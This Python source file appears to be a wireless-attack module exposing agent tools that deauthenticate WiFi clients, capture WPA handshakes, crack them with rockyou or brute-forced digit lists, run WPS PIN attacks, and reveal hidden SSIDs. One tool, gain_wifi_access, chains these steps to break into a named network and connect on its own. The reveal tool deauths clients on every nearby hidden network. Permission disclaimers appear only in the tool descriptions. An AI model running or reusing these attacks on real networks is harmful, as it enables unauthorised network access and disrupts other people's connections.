      "Ubuntu/Mint where no 'wordlists' package exists.")
def download_rockyou() -> str:
    existing, _ = _find_rockyou()
    if existing:
        return f"rockyou.txt is already available at {existing}"
    wordlist_dir = _wordlist_dir()
    try:
        wordlist_dir.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        return f"Could not create {wordlist_dir}: {exc}"

    gz_tmp = wordlist_dir / "rockyou.txt.gz.part"
    error = _download_file(_ROCKYOU_URL, gz_tmp)
    if error:
        gz_tmp.unlink(missing_ok=True)
        return f"Download failed: {error}"
    try:
        out = _decompress_rockyou(gz_tmp)
    finally:
        gz_tmp.unlink(missing_ok=True)
    if not out:
        return "Downloaded file could not be decompressed — it may not be a gzip archive."
    size_mb = out.stat().st_size / 1024 ** 2
    return f"rockyou.txt ready at {out} ({size_mb:.0f} MB)."


# ── Handshake verification ────────────────────────────────────────────────────
# aircrack-ng lists each AP with its handshake count, e.g. "WPA (1 handshake)".
# A capture file always exists after airodump-ng runs — even with zero EAPOL
# frames — so its presence/size proves nothing. We ask aircrack-ng instead and
# only treat a capture as usable when it reports at least one handshake.
_HANDSHAKE_RE = re.compile(r"WPA\s*\(\s*(\d+)\s+handshakes?\b", re.I)
_NO_HANDSHAKE_MARKERS = (
    "no valid wpa handshakes found",
    "packets contained no eapol",
    "no eapol data",
)

_NO_HANDSHAKE_HELP = (
    "  • a client must be associated with the AP and stay in range — a deauth\n"
    "    only forces a reconnect when a client is connected;\n"
    "  • check the BSSID and channel, and that the adapter is in monitor mode;\n"
    "  • give it a longer capture window (clients can be slow to reconnect);\n"
    "  • WPA3-only (SAE) networks can't be cracked from a 4-way handshake."
)


def parse_handshake_count(aircrack_output: str, bssid: str = "") -> int:
    """Handshake count aircrack-ng reports in its output (0 = none).

    Scoped to the target BSSID's row when a BSSID is given, so a handshake
    belonging to a different AP is never credited to the target.
    """
    out = aircrack_output or ""
    target = (bssid or "").lower()
    if target:
        for line in out.splitlines():
            if target in line.lower():
                m = _HANDSHAKE_RE.search(line)
                return int(m.group(1)) if m else 0
        return 0
    return max((int(m.group(1)) for m in _HANDSHAKE_RE.finditer(out)), default=0)


def handshake_count(cap_file: str, bssid: str = "") -> int:
    """Count usable WPA handshakes in a capture by asking aircrack-ng.

    With no wordlist aircrack-ng prints its AP table and exits by itself, so
    this is a safe non-interactive probe (bounded by the runner's timeout).
    """
    if not cap_file or not Path(cap_file).exists():
        return 0
    r = _run("aircrack-ng", cap_file, timeout=60)
    return parse_handshake_count((r.stdout or "") + (r.stderr or ""), bssid)


def _count_handshakes_live(cap_file: str, bssid: str) -> int:
    """Count handshakes in a capture airodump-ng may still be appending to."""
    import shutil
    import tempfile

    src = Path(cap_file)
    try:
        if not src.exists() or src.stat().st_size == 0:
            return 0
        with tempfile.TemporaryDirectory() as td:
            snap = Path(td) / "snap.cap"
            shutil.copyfile(src, snap)
            return handshake_count(str(snap), bssid)
    except OSError:
        return 0


def _deauth_frame_count(cap_file: str) -> int | None:
    """Number of deauth frames in a capture (None when tcpdump is unavailable)."""
    if not cap_file or not Path(cap_file).exists() or _bin_missing("tcpdump"):
        return None
    r = _run("tcpdump", "-r", cap_file, "-nn", "-e", timeout=30)
    if r.returncode != 0:
        return None
    return sum(1 for line in (r.stdout or "").splitlines()
               if "DeAuthentication" in line)


def _eapol_frame_count(cap_file: str) -> int | None:
    """Number of EAPOL frames in a capture (None when tcpdump is unavailable).

    A complete WPA 4-way handshake is 4 EAPOL frames. Seeing only 3 means the
    client never sent its M2 reply — deauth was ignored (e.g. 802.11w/PMF) or
    the client was knocked off before it could answer.
    """
    if not cap_file or not Path(cap_file).exists() or _bin_missing("tcpdump"):
        return None
    r = _run("tcpdump", "-r", cap_file, "-nn", "ether proto 0x888e", timeout=30)
    if r.returncode != 0:
        return None
    return sum(1 for line in (r.stdout or "").splitlines() if "EAPOL" in line)


def _no_handshake_message(cap_file: str, bssid: str) -> str:
    return (
        f"No usable WPA handshake in {cap_file}: aircrack-ng found 0 handshakes "
        '("Packets contained no EAPOL data").\n'
        "Re-capture with capture_handshake(interface, bssid, channel) and check:\n"
        + _NO_HANDSHAKE_HELP
    )


def _crack_reply(out: str, cap_file: str, bssid: str, fallback: str) -> str:
    """Turn aircrack-ng output into a clear result message."""
    for line in out.splitlines():
        if "KEY FOUND" in line:
            return line.strip()
    low = out.lower()
    if any(marker in low for marker in _NO_HANDSHAKE_MARKERS):
        return _no_handshake_message(cap_file, bssid)
    return out.strip()[-500:] or fallback


def _crack_capture(capture_file: str, bssid: str, wordlist: str, fallback: str) -> str:
    """Run aircrack-ng with one wordlist and return the formatted result.

    Shared by the three crack_handshake_* tools, which each only differ in how
    their wordlist is obtained.
    """
    r = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist,
             timeout=_CRACK_TIMEOUT_S)
    return _crack_reply((r.stdout or "") + (r.stderr or ""), capture_file, bssid, fallback)


def _unlink_quietly(path: str) -> None:
    try:
        Path(path).unlink()
    except OSError:
        pass


_AUTO_WORDLIST_MIN = "8"
_AUTO_WORDLIST_MAX = "15"
_AUTO_WORDLIST_CHARSET = "0123456789"


def _auto_wordlist(bssid: str, max_len: str = "8") -> tuple[str | None, str]:
    """Generate a bounded digits-only fallback wordlist for gain_wifi_access."""
    if _bin_missing("crunch") is not None:
        return None, "crunch not found. Run: install_wireless_tools"
    path = f"/tmp/plia_auto_{bssid.replace(':', '')}.txt"
    gen = _run("crunch", _AUTO_WORDLIST_MIN, max_len,
               _AUTO_WORDLIST_CHARSET, "-o", path, timeout=60)
    if gen.returncode != 0:
        return None, f"crunch failed: {(gen.stderr or '').strip()}"
    return path, ""


@tool(description="Crack a WPA handshake capture file using rockyou.txt. Use only on networks you own or have permission to test. Args: capture_file, bssid")
def crack_handshake_rockyou(capture_file: str, bssid: str) -> str:
    if not capture_file or not bssid:
        return "capture_file and bssid are required."
    if not Path(capture_file).exists():
        return f"File not found: {capture_file}"
    if _bin_missing("aircrack-ng"):
        return "aircrack-ng not found. Run: install_wireless_tools"
    wordlist, error = _find_rockyou()
    if not wordlist:
        return error or _rockyou_help()
    return _crack_capture(capture_file, bssid, wordlist, "Key not found in rockyou.txt.")


@tool(description="Crack a WPA handshake using a custom wordlist file. Use only on networks you own or have permission to test. Args: capture_file, bssid, wordlist_file")
def crack_handshake_wordlist(capture_file: str, bssid: str, wordlist_file: str) -> str:
    if not capture_file or not bssid or not wordlist_file:
        return "capture_file, bssid, and wordlist_file are required."
    for f in (capture_file, wordlist_file):
        if not Path(f).exists():
            return f"File not found: {f}"
    if _bin_missing("aircrack-ng"):
        return "aircrack-ng not found. Run: install_wireless_tools"
    return _crack_capture(capture_file, bssid, wordlist_file, "Key not found in wordlist.")


def _stream_auto_crack(capture_file: str, bssid: str) -> str:
    """Stream 8-15 digit candidates from crunch into aircrack (no huge file)."""
    crunch = subprocess.Popen(
        ["crunch", _AUTO_WORDLIST_MIN, _AUTO_WORDLIST_MAX, _AUTO_WORDLIST_CHARSET],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
    )
    crack = subprocess.Popen(
        ["aircrack-ng", capture_file, "-b", bssid, "-w", "-"],
        stdin=crunch.stdout, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    try:
        if crunch.stdout:
            crunch.stdout.close()
        try:
            out, _ = crack.communicate(timeout=_CRACK_TIMEOUT_S)
            return out or "No output from aircrack-ng."
        except subprocess.TimeoutExpired:
            crack.kill()
            crunch.kill()
            out, _ = crack.communicate()
            tail = out or ""
            if "KEY FOUND" in tail:
                return tail
            return (
                f"Auto digit brute force timed out after {_CRACK_TIMEOUT_S}s. "
                "8-15 digits is an astronomically large keyspace "
                "(10^8 through 10^15 candidates); use a shorter range or a "
                "targeted wordlist. Captured handshake is unchanged."
            )
    finally:
        if crack.poll() is None:
            crack.kill()
        if crunch.poll() is None:
            crunch.kill()


@tool(description="Crack a WPA handshake without a prepared wordlist by streaming digits-only candidates (8-15 chars) from crunch into aircrack-ng. No huge temp file. Use only on networks you own or have permission to test. Args: capture_file, bssid")
def crack_handshake_auto(capture_file: str, bssid: str) -> str:
    if not capture_file or not bssid:
        return "capture_file and bssid are required."
    if not Path(capture_file).exists():
        return f"File not found: {capture_file}"
    for b in ("crunch", "aircrack-ng"):
        if _bin_missing(b):
            return f"{b} not found. Run: install_wireless_tools"
    out = _stream_auto_crack(capture_file, bssid)
    return _crack_reply(out, capture_file, bssid,
                        "Key not found with auto-generated wordlist.")


# ── Automatic access recovery (no password) ──────────────────────────────────
# Orchestrates the primitives above so "connect to <ssid>" can recover a key
# on its own when no saved profile exists: WPS first (fast), then handshake
# capture + dictionary/auto cracking. Only networks you own or are authorised
# to test.

_ATTACK_BINS = ("airmon-ng", "airodump-ng", "aireplay-ng", "reaver", "aircrack-ng")


def _dbm(power: str) -> int:
    try:
        return int((power or "").strip())
    except ValueError:
        return -1000


def _parse_airodump_csv(csv_file: Path) -> tuple[list[dict], dict[str, set[str]]]:
    """Parse an airodump-ng CSV into (APs, probes). Probes maps BSSID → probed SSIDs."""
    lines = csv_file.read_text(errors="replace").splitlines()
    networks: list[dict] = []
    probes: dict[str, set[str]] = {}
    section = ""
    for line in lines:
        if line.startswith("BSSID"):
            section = "ap"
            continue
        if line.startswith("Station MAC"):
            section = "station"
            continue
        if not line.strip():
            continue
        parts = [p.strip() for p in line.split(",")]
        if section == "ap" and len(parts) >= 14:
            bssid, ch, enc, power, essid = parts[0], parts[3], parts[5], parts[8], parts[13]
            networks.append({
                "ssid": essid or "",
                "bssid": bssid,
                "channel": ch,
                "enc": enc,
                "power": _dbm(power),
            })
        elif section == "station" and len(parts) >= 7:
            bssid = parts[5]
            probed = parts[6:]  # "Probed ESSIDs" may itself be a comma-separated list
            if bssid:
                probes.setdefault(bssid, set()).update(s.strip() for s in probed if s.strip())
    networks.sort(key=lambda n: -n["power"])
    return networks, probes


def _airodump_run(mon_iface: str, seconds: int,
                  deauth_bssids: list[str] | None = None) -> tuple[list[dict], dict[str, set[str]]]:
    """Run airodump-ng for `seconds`, optionally deauthing BSSIDs after a short settle.
    Returns (APs, probes)."""
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        prefix = os.path.join(tmpdir, "scan")
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "--band", "abg", "-w", prefix,
             "--output-format", "csv", mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        try:
            if deauth_bssids:
                time.sleep(5)
                for bssid in deauth_bssids:
                    _sudo("aireplay-ng", "-0", "5", "-a", bssid, mon_iface, timeout=20)
            time.sleep(seconds)
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
        csv_file = prefix + "-01.csv"
        if not Path(csv_file).exists():
            return [], {}
        return _parse_airodump_csv(Path(csv_file))


def _airodump_scan(mon_iface: str, scan_seconds: int = 15) -> list[dict]:
    """Run airodump-ng and return structured AP rows: {ssid, bssid, channel, enc, power}."""
    aps, _ = _airodump_run(mon_iface, scan_seconds)
    return aps


def _find_target_ap(ssid: str, networks: list[dict]) -> dict | None:
    """Best AP match for a user-supplied SSID.

    Exact name first; then candidates the query is contained in (the user typed
    less than the full SSID, e.g. "home 5" → "Home 5G"), which are preferred over
    candidates merely contained in the query (e.g. "Airport" → "Air"); among
    equally good candidates the strongest signal wins.
    """
    t = ssid.strip().lower()
    if re.fullmatch(r"(?:[0-9a-f]{2}:){5}[0-9a-f]{2}", t):
        for n in networks:
            if n["bssid"].lower() == t:
                return n
        return None
    for n in networks:
        if n["ssid"].lower() == t:
            return n
    best: dict | None = None
    best_rank = -1
    for n in networks:
        sl = n["ssid"].lower()
        if not sl:
            continue
        if t in sl:
            rank = 1
        elif sl in t:
            rank = 0
        else:
            continue
        if rank > best_rank or (rank == best_rank and n["power"] > best["power"]):
            best, best_rank = n, rank
    return best


def _format_ap_table(networks: list[dict]) -> str:
    """Render airodump-ng AP dicts as the ESSID/BSSID/CH/BAND/PWR/ENC table."""
    from modules.network_tools import wifi_band

    labelled = [(n["ssid"] or "<hidden>", n) for n in networks]
    w = max([len(s) for s, _ in labelled] + [5])
    header = f"{'ESSID':<{w}}  BSSID              CH  BAND     PWR  ENC"
    rows = [
        f"{ssid:<{w}}  {n['bssid']}  {n['channel']:>2}  "
        f"{wifi_band(n['channel']):<7}  {n['power']:>4}  {n['enc']}"
        for ssid, n in labelled
    ]
    return "\n".join([header] + rows)


def _wps_psk(mon_iface: str, bssid: str, channel: str) -> str | None:
    """Attempt a WPS PIN attack with reaver; return the recovered PSK or None."""
    out = _reaver_run(mon_iface, bssid, channel)
    m = re.search(r"WPA PSK\s*[:=]\s*['\"]?([^'\"\s]+)", out)
    return m.group(1) if m else None


_CRACK_TIMEOUT_S = 3600        # rockyou takes ~35 min on a laptop CPU
_CAPTURE_ATTEMPTS = 2          # deauth + wait cycles per capture attempt
_CAPTURE_SETTLE_S = 5          # let airodump-ng lock onto the channel first
_CAPTURE_WAIT_S = 30           # time for a client to reconnect before the next deauth
_CAPTURE_PASSIVE_S = 45        # final window with no further deauth, for slow/PMF clients
_PASSIVE_SECONDS = 90          # dedicated passive capture window
_DEAUTH_CLIENT_LIMIT = 8       # unicast deauth to at most this many clients (broadcast covers the rest)


def _capture_handshake_file(mon_iface: str, bssid: str, channel: str,
                            prefix_dir: str = "/tmp",
                            attempts: int = _CAPTURE_ATTEMPTS,
                            prefix: str | None = None,
                            client_macs: list[str] | None = None,
                            deauth: bool = True,
                            passive_seconds: int | None = None,
                            deauth_rc: int = 1) -> str | None:
    """Capture a WPA handshake; return the .cap path once aircrack-ng sees one.

    Keeps a single airodump-ng running and retries the deauth, verifying after
    each attempt so a handshake-less capture is never handed to the cracker.

    A unique prefix is used by default: with a fixed name airodump-ng creates
    ``-02.cap``, ``-03.cap``… when older files exist, while this function would
    keep checking the stale ``-01.cap`` and report a false "0 handshakes".
    """
    prefix = prefix or os.path.join(
        prefix_dir, f"plia_{bssid.replace(':', '')}_{int(time.time())}")
    dump_proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--band", "abg", "--bssid", bssid, "-c", channel,
         "-w", prefix, mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    cap_file = prefix + "-01.cap"
    try:
        if deauth:
            for _ in range(max(1, attempts)):
                time.sleep(_CAPTURE_SETTLE_S)
                # Unicast deauth to each associated client first: many devices
                # ignore broadcast deauth, or the AP only forwards unicast frames.
                for mac in (client_macs or [])[:_DEAUTH_CLIENT_LIMIT]:
                    _sudo("aireplay-ng", "-0", "3", "--deauth-rc", str(deauth_rc),
                          "-a", bssid, "-c", mac, mon_iface, timeout=20)
                _sudo("aireplay-ng", "-0", "3", "--deauth-rc", str(deauth_rc),
                      "-a", bssid, mon_iface, timeout=20)
                time.sleep(_CAPTURE_WAIT_S)
                if _count_handshakes_live(cap_file, bssid) > 0:
                    return cap_file
        # Leave airodump running so a client that ignores deauth (802.11w/PMF)
        # or reconnects late can still complete the handshake on its own.
        passive_for = passive_seconds if passive_seconds is not None else _CAPTURE_PASSIVE_S
        for _ in range(max(1, passive_for // 15)):
            time.sleep(15)
            if _count_handshakes_live(cap_file, bssid) > 0:
                return cap_file
    finally:
        dump_proc.terminate()
        try:
            dump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_proc.kill()
    return None


_NO_INJECTION_DRIVERS = {"iwlwifi", "iwlmvm"}


def _iface_driver(name: str) -> str:
    """Kernel driver for a netdev (strips airmon-ng's 'mon' suffix)."""
    base = name[:-3] if name.endswith("mon") else name
    try:
        return Path(f"/sys/class/net/{base}/device/driver").resolve().name
    except OSError:
        return ""


def _injection_blocked(name: str) -> str:
    """Message when this adapter can monitor but cannot inject 802.11 frames."""
    drv = _iface_driver(name)
    if drv in _NO_INJECTION_DRIVERS:
        return (
            f"The adapter {name} uses the '{drv}' driver, which can monitor but "
            "cannot inject frames. Deauth, WPS and handshake-forcing need injection; "
            "aireplay-ng --test reports 0/30 and write failures on this card. "
            "Use a USB WiFi adapter with monitor+injection support (e.g. AR9271, "
            "RTL8812AU or MT7921AU) and pass its interface, or use passive=true to "
            "wait for a natural reconnect."
        )
    return ""


def _is_monitor_iface(name: str) -> bool:
    """True when `name` exists and is a monitor-mode interface."""
    if not name or name not in _link_names():
        return False
    if name.endswith("mon"):
        return True
    try:
        r = _run("iw", "dev", name, "info", timeout=5)
    except (OSError, subprocess.SubprocessError):
        return False
    return "type monitor" in (r.stdout or "")


def _parse_stations(csv_file: Path) -> list[dict]:
    """Parsed station rows from an airodump-ng CSV: MAC, power, associated AP."""
    stations: list[dict] = []
    section = ""
    for line in csv_file.read_text(errors="replace").splitlines():
        if line.startswith("BSSID"):
            section = "ap"
            continue
        if line.startswith("Station MAC"):
            section = "station"
            continue
        if section != "station" or not line.strip():
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) >= 6 and parts[0]:
            stations.append({
                "station": parts[0],
                "power": _dbm(parts[3]),
                "ap": parts[5],
            })
    return stations


_PREFLIGHT_SCAN_S = 25


def _scan_network(mon_iface: str, seconds: int = _PREFLIGHT_SCAN_S) -> tuple[list[dict], list[dict]]:
    """One all-channel monitor-mode capture; returns (APs, stations)."""
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        prefix = os.path.join(tmpdir, "scan")
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "--band", "abg", "-w", prefix,
             "--output-format", "csv", mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        try:
            time.sleep(seconds)
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
        csv_file = Path(prefix + "-01.csv")
        if not csv_file.exists():
            return [], []
        aps, _probes = _parse_airodump_csv(csv_file)
        return aps, _parse_stations(csv_file)


def _preflight_target(mon_iface: str, bssid: str, channel: str) -> dict | str:
    """Check the target is visible and has at least one client before capturing.

    Returns {"channel", "ssid", "clients"} on success, otherwise a message
    explaining why no handshake can be captured (wrong BSSID, idle BSSID,
    single-adapter limitation, …).
    """
    aps, stations = _scan_network(mon_iface, _PREFLIGHT_SCAN_S)
    if not aps:
        return (
            f"The monitor interface saw no WiFi networks in a {_PREFLIGHT_SCAN_S}-second scan. "
            "Monitor mode may not be working on this adapter — check it with "
            "`start_monitor_mode`, or use a USB adapter that supports monitor mode."
        )

    from modules.network_tools import wifi_band

    target = next((a for a in aps if a["bssid"].lower() == bssid.lower()), None)
    if target is None:
        return (
            f"{bssid} was not seen in a {_PREFLIGHT_SCAN_S}-second monitor-mode scan. "
            "Check the BSSID and channel and that the adapter is in range; if the "
            "network is 5 GHz, make sure this adapter supports that band."
        )

    actual_channel = str(target.get("channel") or channel or "")
    ssid = target.get("ssid") or ""
    same = [a for a in aps if ssid and a["ssid"].lower() == ssid.lower()]
    counts = {
        a["bssid"]: sum(1 for s in stations if s["ap"].lower() == a["bssid"].lower())
        for a in same
    }
    here = counts.get(bssid, 0)
    if here == 0:
        lines = [
            f"No clients are associated with {bssid} "
            f"({ssid or 'unknown SSID'}, channel {actual_channel}, "
            f"{wifi_band(actual_channel)}).",
            "A WPA 4-way handshake only exists when a client connects to that BSSID; "
            "deauth cannot create one if nobody is associated.",
        ]
        alternates = [
            (a["bssid"], str(a.get("channel") or "?"), counts.get(a["bssid"], 0))
            for a in same
            if a["bssid"].lower() != bssid.lower()
        ]
        with_clients = [x for x in alternates if x[2] > 0]
        if with_clients:
            lines.append(
                "Clients are on: "
                + ", ".join(
                    f"{b} (ch {c}, {wifi_band(c)}, {n} client{'s' if n != 1 else ''})"
                    for b, c, n in with_clients
                )
                + ". Target one of those BSSIDs — the mobile may be on the 5 GHz "
                "BSSID even though the 2.4 GHz one is visible."
            )
        elif alternates:
            lines.append(
                "Other BSSIDs for this SSID: "
                + ", ".join(
                    f"{b} (ch {c}, {wifi_band(c)}, {n} client{'s' if n != 1 else ''})"
                    for b, c, n in alternates
                )
                + ". A phone in power save may not appear until it reconnects; "
                "target the BSSID your mobile actually uses."
            )
        else:
            lines.append(
                "No clients were seen on any BSSID of this SSID. Keep a phone or "
                "another computer connected to the network during the capture."
            )
        lines.append(
            "If this machine is the only client: its single WiFi adapter has to "
            "leave managed mode to monitor, so it cannot also stay connected. Use "
            "a USB WiFi adapter for monitoring while the internal card stays "
            "connected, or use a second device as the client."
        )
        return "\n".join(lines)

    client_macs = list(dict.fromkeys(
        s["station"] for s in stations
        if s["ap"].lower() == bssid.lower() and s.get("station")
    ))
    return {
        "channel": actual_channel,
        "ssid": ssid,
        "clients": here,
        "client_macs": client_macs[:_DEAUTH_CLIENT_LIMIT],
    }


def _aircrack_psk(capture_file: str, bssid: str, wordlist: str) -> str | None:
    """Crack a capture with a wordlist; return the PSK or None."""
    r = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist, timeout=600)
    out = r.stdout + r.stderr
    for line in out.splitlines():
        if "KEY FOUND" in line:
            m = re.search(r"\[(.+?)\]", line)
            return m.group(1).strip() if m else "found"
    return None


def _crack_with_wordlists(capture_file: str, bssid: str) -> str | None:
    """Try rockyou.txt, then an auto-generated digits-only wordlist."""
    wordlist, _ = _find_rockyou()
    if wordlist:
        psk = _aircrack_psk(capture_file, bssid, wordlist)
        if psk:
            return psk
    auto, _ = _auto_wordlist(bssid)
    if not auto:
        return None
    try:
        return _aircrack_psk(capture_file, bssid, auto)
    finally:
        _unlink_quietly(auto)


def _stop_monitor(mon_iface: str) -> None:
    """Restore managed mode and NetworkManager after a monitor-mode session."""
    if not mon_iface or _detect_monitor_interface() is None:
        return
    _sudo("airmon-ng", "stop", mon_iface, timeout=15)
    _sudo("systemctl", "restart", "NetworkManager", timeout=10)


@tool(description="Obtain access to a WiFi network when you don't have its password, using WPS first and then a WPA handshake capture + crack. SSID or BSSID is accepted. Connects automatically if a key is recovered. Use only on networks you own or have explicit permission to test. Requires Admin + the Wireless Tools grant.")
def gain_wifi_access(ssid: str, interface: str = "") -> str:
    ssid = (ssid or "").strip()
    if not ssid:
        return "ssid is required."
    if not _has_wireless_admin():
        return (
            "Permission denied. Set the Wireless Tools to Admin in Settings → Permissions "
            "and run the grant command shown there, then retry."
        )
    missing = [b for b in _ATTACK_BINS if _bin_missing(b)]
    if missing:
        return f"Missing tools: {', '.join(missing)}. Run install_wireless_tools first."

    iface = interface or _detect_wifi_interface()
    if not iface:
        return "No WiFi interface found. Specify one explicitly."
    blocked = _injection_blocked(iface)
    if blocked:
        return blocked

    mon = _detect_monitor_interface()
    if not mon:
        r = _sudo("airmon-ng", "start", iface, timeout=15)
        if r.returncode != 0:
            return f"Could not start monitor mode on {iface}: {(r.stdout + r.stderr).strip()}"
        mon = _detect_monitor_interface() or iface + "mon"

    recovered: str | None = None
    method = ""
    failure = ""
    try:
        ap = _find_target_ap(ssid, _airodump_scan(mon, 15))
        if ap is None:
            failure = f"Could not find '{ssid}' in range (monitor scan)."
        else:
            bssid, channel = ap["bssid"], ap["channel"]
            recovered = _wps_psk(mon, bssid, channel)
            if recovered:
                method = "WPS"
            else:
                cap = _capture_handshake_file(mon, bssid, channel)
                if cap is None:
                    failure = (
                        f"No handshake captured for '{ssid}' after {_CAPTURE_ATTEMPTS} attempts. "
                        "A client must be connected and (re)connect during the capture; check the "
                        "channel and that the adapter is in monitor mode. WPA3-only networks "
                        "can't be cracked this way."
                    )
                else:
                    recovered = _crack_with_wordlists(cap, bssid)
                    if recovered:
                        method = "handshake cracking"
                    else:
                        failure = (
                            f"Handshake captured at {cap} but the key was not in the default "
                            "wordlists. Run crack_handshake_wordlist with a better wordlist."
                        )
    except Exception as exc:
        failure = f"Access recovery failed: {exc}"
    finally:
        _stop_monitor(mon)

    if recovered:
        from modules.network_tools import connect_wifi
        target_ssid = ap["ssid"] if ap and ap.get("ssid") else ssid
        connect_result = connect_wifi(target_ssid, iface, recovered)
        return f"Recovered the key for '{target_ssid}' via {method}. {connect_result}"
    return failure or f"Could not obtain access to '{ssid}'."


@tool(description="Reveal the SSID of every nearby hidden WiFi network (networks that don't broadcast their name). Puts the interface in monitor mode, deauths clients so they re-announce the SSID, and reports all revealed names. Use only on networks you own or have permission to test. Requires Admin + the Wireless Tools grant.")
def reveal_hidden_ssid(interface: str = "") -> str:
    if not _has_wireless_admin():
        return (
            "Permission denied. Set the Wireless Tools to Admin in Settings → Permissions "
            "and run the grant command shown there, then retry."
        )
    missing = [b for b in ("airmon-ng", "airodump-ng", "aireplay-ng") if _bin_missing(b)]
    if missing:
        return f"Missing tools: {', '.join(missing)}. Run install_wireless_tools first."

    iface = interface or _detect_wifi_interface()
    if not iface:
        return "No WiFi interface found. Specify one explicitly."
    blocked = _injection_blocked(iface)
    if blocked:
        return blocked

    mon = _detect_monitor_interface()
    if not mon:
        r = _sudo("airmon-ng", "start", iface, timeout=15)
        if r.returncode != 0:
            return f"Could not start monitor mode on {iface}: {(r.stdout + r.stderr).strip()}"
        mon = _detect_monitor_interface() or iface + "mon"

    try:
        # 1. Find APs that broadcast no SSID.
        aps, _ = _airodump_run(mon, 15)
        hidden = [ap for ap in aps if not ap["ssid"]]
        if not hidden:
            return "No hidden networks found — all nearby networks broadcast their SSID."

        # 2. Deauth clients on each hidden AP so they re-announce the SSID on reconnect.
        bssids = [ap["bssid"] for ap in hidden]
        aps2, probes2 = _airodump_run(mon, 20, deauth_bssids=bssids)

        # 3. Map every hidden BSSID to a revealed name.
        lines = [f"Found {len(hidden)} hidden network(s):"]
        for ap in hidden:
            bssid = ap["bssid"]
            name = ""
            for ap2 in aps2:
                if ap2["bssid"] == bssid and ap2["ssid"]:
                    name = ap2["ssid"]
                    break
            if name:
                lines.append(f"{bssid} → {name!r}")
            else:
                candidates = sorted(probes2.get(bssid, set()))
                if candidates:
                    lines.append(f"{bssid} → candidates: {', '.join(repr(c) for c in candidates)}")
                else:
                    lines.append(f"{bssid} → not revealed (no client reconnected to deauth)")
        return "\n".join(lines)
    except Exception as exc:
        return f"Could not reveal hidden SSIDs: {exc}"
    finally:
        _stop_monitor(mon)
